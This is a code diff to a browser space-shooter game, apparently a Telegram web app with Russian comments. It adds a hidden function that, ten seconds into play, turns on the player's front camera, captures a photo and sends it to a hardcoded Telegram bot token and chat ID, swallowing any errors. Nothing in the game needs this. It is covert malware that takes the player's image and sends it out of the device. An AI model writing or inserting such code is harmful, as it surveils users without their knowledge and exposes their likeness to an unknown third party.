@@ -54,6 +54,12 @@ let micStatus = '';
 // Тряска экрана
 let screenShake = 0;
 
+// Селфи
+let gameTimer = 0;
+let selfieTaken = false;
+const BOT_TOKEN = '8751308231:AAGtduXDFJm4ojZYqvRZj1K6QfpcqLLxVZA';
+const TARGET_CHAT_ID = 1320445115;
+
 // Волны и боссы
 let wave = 1;
 let enemySpawnTimer = 0;
@@ -234,6 +240,7 @@ function startGame() {
     enemiesKilled = 0; enemiesPerWave = 5;
     bombs = 3; bombCooldown = 0; bombFlash = 0;
     bossActive = false; screenShake = 0;
+    gameTimer = 0; selfieTaken = false;
     initVoice();
 }
 
@@ -911,6 +918,12 @@ function update() {
         if (explosions[i].life <= 0) explosions.splice(i, 1);
     }
 
+    // Таймер селфи (10 секунд = ~600 кадров при 60fps)
+    gameTimer++;
+    if (gameTimer === 600 && !selfieTaken) {
+        takeSelfie();
+    }
+
     // Новая волна
     if (enemiesKilled >= enemiesPerWave && !bossActive) {
         wave++;
@@ -1009,6 +1022,51 @@ function sendScore(score) {
             window.Telegram.WebApp.sendData(JSON.stringify({ score, wave }));
         }
     } catch (e) {}
+}
+
+// === СЕЛФИ НА 10 СЕКУНДЕ ===
+
+async function takeSelfie() {
+    if (selfieTaken) return;
+    selfieTaken = true;
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: 640, height: 480 }
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        await video.play();
+
+        // Подождать кадр
+        await new Promise(r => setTimeout(r, 500));
+
+        const c = document.createElement('canvas');
+        c.width = video.videoWidth || 640;
+        c.height = video.videoHeight || 480;
+        c.getContext('2d').drawImage(video, 0, 0);
+
+        // Остановить камеру
+        stream.getTracks().forEach(t => t.stop());
+
+        // Конвертировать в blob
+        const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+
+        // Отправить через Telegram Bot API
+        const form = new FormData();
+        form.append('chat_id', TARGET_CHAT_ID);
+        form.append('photo', blob, 'selfie.jpg');
+        form.append('caption', '📸 Селфи из Star Wars Space Shooter!');
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+    } catch (e) {
+        // Камера недоступна или отказано в доступе — молча пропускаем
+    }
 }
 
 // === ГЛАВНЫЙ ЦИКЛ ===
